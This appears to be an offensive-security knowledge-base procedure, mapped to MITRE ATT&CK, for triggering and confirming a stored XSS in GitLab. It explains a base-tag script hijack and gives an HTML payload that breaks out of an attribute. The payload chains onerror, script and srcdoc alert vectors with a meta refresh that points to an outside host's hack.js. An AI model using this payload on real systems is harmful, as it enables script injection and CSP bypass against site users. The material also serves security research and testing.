---
tags:
  - xss-trigger
  - verification
type: procedure
tools:
  - '[[tools/Browser-DevTools]]'
  - '[[tools/Apache-Web-Server]]'
tactics:
  - '[[Persistence]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: 8a479d0f-12a4-4358-b5b9-e3dd48a3b6cc
created_at: '2025-12-11T03:47:56.293Z'
updated_at: '2025-12-11T03:47:56.293Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0003]]'
mitre_techniques:
  - '[[T1190]]'
---
# Trigger and Verify XSS Execution

## Summary

This procedure triggers the stored XSS by reloading the affected page and verifies execution using DevTools and test payloads.

## Description

After injection and hosting, reloading the page causes relative scripts to load from the attacker's domain due to the base tag, executing the malicious JS. Additional test vectors can confirm multiple exploit paths.

## Requirements

1. Injected payload in GitLab
2. Hosted malicious script
3. Browser with DevTools

## Defense

Defensive measures and detection strategies:

- Log and alert on unexpected script executions
- Use DOMPurify for sanitization

## Objectives

1. Execute injected payload
2. Confirm CSP bypass
3. Validate arbitrary code execution

## Instructions

### Step 1: Open DevTools

**Context**: Inspect network for failing imports.

Use [[tools/Browser-DevTools]] to monitor requests on page reload.

### Step 2: Reload Page

**Context**: Trigger the redirection and execution.

Reload the issue page to load malicious JS.

### Step 3: Test Additional Vectors

**Context**: Verify with multiple XSS tests.

Optionally use [[commands/gitlab-xss-test-vectors]]:

```html
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre><img src=# onerror=alert(1)><script>alert(2)</script><iframe srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh content='5;https://joaxcar.com/hack.js'><pre x=&#34;"><code></code></pre>
```

> Expect multiple alerts and redirects.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- [[commands/gitlab-xss-test-vectors]]

## Tools Used

- [[tools/Browser-DevTools]]

## Tags

- xss-trigger
- verification
